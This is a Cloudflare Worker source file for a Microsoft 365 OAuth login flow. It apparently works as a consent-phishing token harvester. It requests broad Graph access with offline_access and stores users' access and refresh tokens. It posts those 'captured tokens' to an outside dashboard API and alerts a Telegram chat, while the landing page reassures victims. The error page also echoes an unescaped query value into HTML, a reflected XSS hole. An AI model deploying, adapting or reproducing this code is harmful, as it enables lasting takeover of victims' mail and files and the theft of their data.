/**
 * Cloudflare Worker - Microsoft 365 OAuth Authorization Handler
 *
 * Handles the full Azure AD OAuth 2.0 authorization code flow:
 * 1. Serves the authorization landing page
 * 2. Redirects user to Microsoft login
 * 3. Receives the authorization callback
 * 4. Exchanges code for tokens (access + refresh)
 * 5. Stores tokens in Cloudflare KV
 * 6. POSTs tokens to Render dashboard API
 * 7. Sends Telegram admin notification
 * 8. Redirects user to a success page
 */

// ─── Entry point ─────────────────────────────────────────────────────────────

addEventListener('fetch', (event) => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);

  try {
    switch (url.pathname) {
      case '/':
      case '/authorize':
        return handleAuthorizePage(request);
      case '/login':
        return handleLoginRedirect(request);
      case '/callback':
        return handleCallback(request);
      case '/success':
        return handleSuccessPage(request);
      case '/health':
        return new Response(JSON.stringify({ status: 'ok', service: 'cloudflare-oauth-worker' }), {
          headers: { 'Content-Type': 'application/json' },
        });
      default:
        return new Response('Not Found', { status: 404 });
    }
  } catch (err) {
    console.error('Worker error:', err);
    return new Response(renderErrorPage('An unexpected error occurred. Please try again.'), {
      status: 500,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }
}

// ─── Route handlers ───────────────────────────────────────────────────────────

/**
 * Serve the OAuth authorization landing page.
 */
function handleAuthorizePage(request) {
  const html = renderAuthPage();
  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
  });
}

/**
 * Build the Microsoft authorization URL and redirect the user.
 */
function handleLoginRedirect(request) {
  const authUrl = buildAuthUrl();
  return Response.redirect(authUrl, 302);
}

/**
 * Handle the OAuth callback from Microsoft.
 * Exchange the authorization code for tokens, persist them, and notify.
 */
async function handleCallback(request) {
  const url = new URL(request.url);
  const code = url.searchParams.get('code');
  const error = url.searchParams.get('error');
  const errorDescription = url.searchParams.get('error_description');

  if (error) {
    const message = errorDescription || error;
    await sendTelegramNotification(`⚠️ OAuth Error\n\n${message}`);
    return new Response(renderErrorPage(message), {
      status: 400,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  if (!code) {
    return new Response(renderErrorPage('Missing authorization code.'), {
      status: 400,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  // Exchange code for tokens
  const tokenData = await exchangeCodeForTokens(code, request);
  if (!tokenData) {
    return new Response(renderErrorPage('Failed to exchange authorization code for tokens.'), {
      status: 500,
      headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
  }

  // Decode JWT to extract user info (access_token is a JWT from MS)
  const userInfo = decodeJwtPayload(tokenData.access_token);
  const email = userInfo?.preferred_username || userInfo?.upn || userInfo?.email || 'unknown@unknown.com';
  const userId = userInfo?.oid || userInfo?.sub || email;
  const tokenExpiry = new Date(Date.now() + tokenData.expires_in * 1000).toISOString();

  const payload = {
    user_id: userId,
    email,
    access_token: tokenData.access_token,
    refresh_token: tokenData.refresh_token,
    token_expiry: tokenExpiry,
  };

  // Persist to KV
  await storeTokensInKV(userId, payload);

  // Forward to Render dashboard API
  await postTokensToRender(payload);

  // Notify Telegram
  await sendTelegramNotification(
    `✅ New Microsoft 365 Account Added\n\n` +
      `📧 Email: ${email}\n` +
      `🆔 User ID: ${userId}\n` +
      `⏰ Token Expires: ${new Date(tokenExpiry).toLocaleString()}\n\n` +
      `The account is now active in the dashboard.`
  );

  // Redirect to success page
  return Response.redirect(new URL('/success', request.url).href, 302);
}

/**
 * Render the success / completion page.
 */
function handleSuccessPage(request) {
  return new Response(renderSuccessPage(), {
    headers: { 'Content-Type': 'text/html; charset=utf-8' },
  });
}

// ─── OAuth helpers ────────────────────────────────────────────────────────────

/**
 * Construct the Azure AD authorization URL.
 */
function buildAuthUrl() {
  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    response_type: 'code',
    redirect_uri: REDIRECT_URI,
    response_mode: 'query',
    scope: 'openid profile email offline_access https://graph.microsoft.com/.default',
    prompt: 'select_account',
  });
  return `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/authorize?${params}`;
}

/**
 * Exchange an authorization code for access + refresh tokens.
 */
async function exchangeCodeForTokens(code, request) {
  const body = new URLSearchParams({
    client_id: CLIENT_ID,
    client_secret: CLIENT_SECRET,
    code,
    redirect_uri: REDIRECT_URI,
    grant_type: 'authorization_code',
  });

  try {
    const response = await fetch(
      `https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      }
    );

    if (!response.ok) {
      const text = await response.text();
      console.error('Token exchange failed:', text);
      return null;
    }

    return response.json();
  } catch (err) {
    console.error('Token exchange error:', err);
    return null;
  }
}

// ─── Storage ──────────────────────────────────────────────────────────────────

/**
 * Persist token payload to Cloudflare KV under the given userId key.
 * The KV namespace binding is named TOKENS in wrangler.toml.
 */
async function storeTokensInKV(userId, payload) {
  try {
    // TOKENS is the KV namespace binding
    await TOKENS.put(userId, JSON.stringify(payload), {
      // Keep the token entry for 90 days
      expirationTtl: 60 * 60 * 24 * 90,
    });
  } catch (err) {
    console.error('KV store error:', err);
  }
}

// ─── Render API ───────────────────────────────────────────────────────────────

/**
 * POST captured tokens to the centralized Render dashboard API.
 */
async function postTokensToRender(payload) {
  if (!RENDER_API_URL) return;

  try {
    const response = await fetch(RENDER_API_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const text = await response.text();
      console.error('Render API error:', response.status, text);
    }
  } catch (err) {
    console.error('Failed to reach Render API:', err);
  }
}

// ─── Telegram ─────────────────────────────────────────────────────────────────

/**
 * Send an admin notification via the Telegram Bot API.
 */
async function sendTelegramNotification(message) {
  if (!BOT_TOKEN || !CHAT_ID) return;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (err) {
    console.error('Telegram notification error:', err);
  }
}

// ─── Utilities ────────────────────────────────────────────────────────────────

/**
 * Decode a JWT payload without verifying the signature.
 * Used only for reading user identity claims from the access token.
 */
function decodeJwtPayload(token) {
  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;
    // Base64url → Base64 → JSON
    const base64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    const json = atob(base64);
    return JSON.parse(json);
  } catch {
    return null;
  }
}

// ─── HTML templates ───────────────────────────────────────────────────────────

function renderAuthPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Microsoft 365 Authorization</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .card {
      background: rgba(255,255,255,0.07);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 20px;
      padding: 48px 40px;
      max-width: 440px;
      width: 90%;
      text-align: center;
      box-shadow: 0 25px 50px rgba(0,0,0,0.4);
    }
    .logo { font-size: 3rem; margin-bottom: 12px; }
    h1 { font-size: 1.6rem; font-weight: 700; margin-bottom: 8px; }
    p { color: rgba(255,255,255,0.65); font-size: 0.95rem; line-height: 1.6; margin-bottom: 32px; }
    .btn {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      background: #0078d4;
      color: #fff;
      text-decoration: none;
      padding: 14px 32px;
      border-radius: 10px;
      font-size: 1rem;
      font-weight: 600;
      transition: background 0.2s, transform 0.1s;
      border: none;
      cursor: pointer;
    }
    .btn:hover { background: #006cbe; transform: translateY(-1px); }
    .btn:active { transform: translateY(0); }
    .footer { margin-top: 28px; font-size: 0.78rem; color: rgba(255,255,255,0.35); }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">🔐</div>
    <h1>Microsoft 365 Authorization</h1>
    <p>
      Click the button below to securely authorize access to your
      Microsoft 365 account. You will be redirected to the official
      Microsoft login page.
    </p>
    <a class="btn" href="/login">
      <svg width="20" height="20" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
        <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
        <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
        <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
      </svg>
      Sign in with Microsoft
    </a>
    <p class="footer">Your credentials are handled directly by Microsoft. We never see your password.</p>
  </div>
</body>
</html>`;
}

function renderSuccessPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authorization Successful</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .card {
      background: rgba(255,255,255,0.07);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,0.12);
      border-radius: 20px;
      padding: 48px 40px;
      max-width: 440px;
      width: 90%;
      text-align: center;
      box-shadow: 0 25px 50px rgba(0,0,0,0.4);
    }
    .icon { font-size: 4rem; margin-bottom: 16px; animation: pop 0.4s ease; }
    @keyframes pop { 0% { transform: scale(0); } 70% { transform: scale(1.2); } 100% { transform: scale(1); } }
    h1 { font-size: 1.7rem; font-weight: 700; margin-bottom: 12px; color: #4ade80; }
    p { color: rgba(255,255,255,0.65); font-size: 0.95rem; line-height: 1.6; }
    .footer { margin-top: 28px; font-size: 0.78rem; color: rgba(255,255,255,0.35); }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">✅</div>
    <h1>Authorization Successful!</h1>
    <p>
      Your Microsoft 365 account has been successfully linked.
      The admin has been notified and your account is now active
      in the management dashboard.
    </p>
    <p class="footer">You may close this window.</p>
  </div>
</body>
</html>`;
}

function renderErrorPage(message) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Authorization Error</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
    }
    .card {
      background: rgba(255,255,255,0.07);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255,100,100,0.2);
      border-radius: 20px;
      padding: 48px 40px;
      max-width: 440px;
      width: 90%;
      text-align: center;
      box-shadow: 0 25px 50px rgba(0,0,0,0.4);
    }
    .icon { font-size: 4rem; margin-bottom: 16px; }
    h1 { font-size: 1.7rem; font-weight: 700; margin-bottom: 12px; color: #f87171; }
    p { color: rgba(255,255,255,0.65); font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
    .btn {
      display: inline-block;
      background: rgba(255,255,255,0.1);
      color: #fff;
      text-decoration: none;
      padding: 12px 28px;
      border-radius: 10px;
      font-size: 0.95rem;
      font-weight: 600;
      transition: background 0.2s;
    }
    .btn:hover { background: rgba(255,255,255,0.18); }
  </style>
</head>
<body>
  <div class="card">
    <div class="icon">❌</div>
    <h1>Authorization Failed</h1>
    <p>${message}</p>
    <a class="btn" href="/">Try Again</a>
  </div>
</body>
</html>`;
}
